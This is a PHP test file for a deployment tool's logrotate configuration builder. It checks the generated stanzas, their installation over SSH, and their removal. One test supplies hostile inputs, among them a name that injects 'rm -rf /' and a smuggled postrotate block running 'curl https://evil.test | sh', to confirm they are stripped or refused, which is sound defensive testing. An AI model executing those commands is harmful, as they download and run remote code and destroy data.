<?php

declare(strict_types=1);

use App\Enums\ApplicationType;
use App\Exceptions\UnsafeNameException;
use App\Jobs\DetachApplication;
use App\Models\Application;
use App\Models\Server;
use App\Services\Deployment\CrontabBuilder;
use App\Services\Process\FpmPoolBuilder;
use App\Services\Process\LogRotateBuilder;
use App\Services\Process\ProcessManager;
use App\Services\Process\SystemdUnitBuilder;
use App\Services\Runtime\AsdfManager;
use App\Services\SSH\SSHConnection;
use App\Services\SSH\SSHConnectionManager;
use Tests\Support\FakeSSHTransport;

const ROTATION_FILE = '/etc/logrotate.d/coresmith-app-shop';

function rotationApp(array $attributes = []): Application
{
    return Application::factory()->create([
        'slug' => 'shop',
        'name' => 'Shop',
        'system_user' => 'coresmith-app-shop',
        'type' => ApplicationType::Js,
        'framework' => 'sveltekit',
        'js_runtime' => 'node',
        'node_version' => '24.15.0',
        'php_version' => null,
        'base_port' => 8000,
        'domain' => null,
        'processes' => [['name' => 'queue', 'command' => 'node queue.js']],
        ...$attributes,
    ]);
}

function rotationConnection(FakeSSHTransport $transport, string $user = 'root'): SSHConnection
{
    $server = Server::factory()->create(['host_key_fingerprint' => null, 'ssh_user' => $user]);

    return (new SSHConnection($server, $transport))->connect();
}

function rotationProcesses(): ProcessManager
{
    $asdf = new AsdfManager;

    return new ProcessManager(new SystemdUnitBuilder($asdf), new FpmPoolBuilder($asdf));
}

function rotationListed(string $stanza): array
{
    return array_values(preg_grep('~^/~', explode("\n", $stanza)) ?: []);
}

test('an app gets one file that rotates its process logs as root and its scheduler log as the app', function () {
    expect((new LogRotateBuilder)->build(rotationApp(), ['web', 'queue']))->toBe(<<<'STANZA'
    # Coresmith managed log rotation for shop - do not edit manually
    /var/coresmith/logs/shop/web.log
    /var/coresmith/logs/shop/queue.log
    {
        su root root
        daily
        maxsize 100M
        rotate 7
        compress
        copytruncate
        missingok
        notifempty
    }

    /var/coresmith/apps/shop/shared/logs/scheduler.log
    {
        su coresmith-app-shop coresmith-app-shop
        daily
        maxsize 100M
        rotate 7
        compress
        copytruncate
        missingok
        notifempty
    }

    STANZA);
});

test('an app whose processes write no log file only has its scheduler log rotated', function () {
    expect((new LogRotateBuilder)->build(rotationApp(), []))->toBe(<<<'STANZA'
    # Coresmith managed log rotation for shop - do not edit manually
    /var/coresmith/apps/shop/shared/logs/scheduler.log
    {
        su coresmith-app-shop coresmith-app-shop
        daily
        maxsize 100M
        rotate 7
        compress
        copytruncate
        missingok
        notifempty
    }

    STANZA);
});

test('installing the processes lists exactly the files their units append to and the file the scheduler writes', function (array $attributes, array $processes) {
    $transport = new FakeSSHTransport;
    $application = rotationApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => 'node schedule.js']], ...$attributes]);

    rotationProcesses()->install(rotationConnection($transport), $application);

    $units = implode("\n", array_filter($transport->uploads(), fn(string $path): bool => str_starts_with($path, SystemdUnitBuilder::UNIT_DIR . '/'), ARRAY_FILTER_USE_KEY));
    preg_match_all('/^StandardOutput=append:(\S+)$/m', $units, $appended);
    preg_match("/>> '([^']+)' 2>&1/", implode("\n", app(CrontabBuilder::class)->scripts($application)), $scheduled);
    $stanza = $transport->uploads()[ROTATION_FILE] ?? '';

    expect($stanza)->toBe((new LogRotateBuilder)->build($application, $processes))
        ->and(rotationListed($stanza))->toBe([...$appended[1], $scheduled[1]]);
})->with([
    'a node app with a worker' => [[], ['web', 'queue']],
    'a php app, whose php-fpm logs to the journal' => [['type' => ApplicationType::Php, 'framework' => 'laravel', 'php_version' => '8.5.5', 'node_version' => null], ['queue']],
    'a static site' => [['type' => ApplicationType::Static, 'framework' => null, 'node_version' => null, 'processes' => null], []],
]);

test('the stanza is written by root from names Coresmith checked, never from what the app was given', function () {
    $transport = new FakeSSHTransport;
    $application = rotationApp([
        'name' => "Shop'; rm -rf / #",
        'processes' => [['name' => 'queue', 'command' => "node queue.js\npostrotate\n    curl https://evil.test | sh\nendscript"]],
        'env_variables' => 'SECRET=hunter2',
    ]);

    (new LogRotateBuilder)->write(rotationConnection($transport, 'deploy'), $application, ['web', 'queue']);

    $stanza = $transport->uploads()[FakeSSHTransport::STAGED_UPLOAD] ?? '';
    $rotation = array_values(array_filter($transport->commands(), fn(string $command): bool => str_contains($command, LogRotateBuilder::DIRECTORY)));

    expect($stanza)->toBe((new LogRotateBuilder)->build($application, ['web', 'queue']))
        ->and($stanza)->not->toContain('evil.test')
        ->and($stanza)->not->toContain('postrotate')
        ->and($stanza)->not->toContain('rm -rf')
        ->and($stanza)->not->toContain('hunter2')
        ->and($rotation)->toHaveCount(3)
        ->and($rotation[0])->toBe("sudo mkdir -p '/etc/logrotate.d'")
        ->and($rotation[1])->toStartWith('sudo bash -c ')->toContain(FakeSSHTransport::STAGED_UPLOAD)
        ->and($rotation[2])->toBe('sudo bash -c ' . escapeshellarg("chown root:root '" . ROTATION_FILE . "' && chmod 644 '" . ROTATION_FILE . "'"))
        ->and(implode("\n", $transport->commands()))->not->toContain('evil.test')
        ->and(implode("\n", $transport->commands()))->not->toContain('hunter2')
        ->and(implode("\n", $transport->commands()))->not->toContain('rm -rf /');
});

test('a name that could add a directive is refused before anything reaches the server', function (Application $application, array $processes) {
    $transport = new FakeSSHTransport;

    expect(fn() => (new LogRotateBuilder)->write(rotationConnection($transport), $application, $processes))->toThrow(UnsafeNameException::class);

    expect($transport->commands())->toBe([])
        ->and($transport->uploads())->toBe([]);
})->with([
    'a process name' => [fn(): Application => rotationApp(), ["queue\npostrotate"]],
    'a system user ending in a newline' => [fn(): Application => Application::factory()->make(['slug' => 'shop', 'system_user' => "coresmith-app-shop\n"]), []],
]);

test('removing the processes removes the stanza once the units are gone', function () {
    $transport = new FakeSSHTransport;

    rotationProcesses()->uninstall(rotationConnection($transport), rotationApp());

    $commands = $transport->commands();
    $removed = array_search("rm -f '" . ROTATION_FILE . "'", $commands, true);

    expect($removed)->not->toBeFalse()
        ->and($removed)->toBeGreaterThan(array_search('systemctl daemon-reload', $commands, true));
});

test('detaching an app removes its stanza with the rest of it', function () {
    $application = rotationApp();
    $application->delete();
    $transport = new FakeSSHTransport;

    SSHConnectionManager::createTransportUsing(fn(): FakeSSHTransport => $transport);

    try {
        app()->call([new DetachApplication($application), 'handle']);
    } finally {
        SSHConnectionManager::createTransportUsing(null);
    }

    expect($transport->commands())->toContain("rm -f '" . ROTATION_FILE . "'");
});
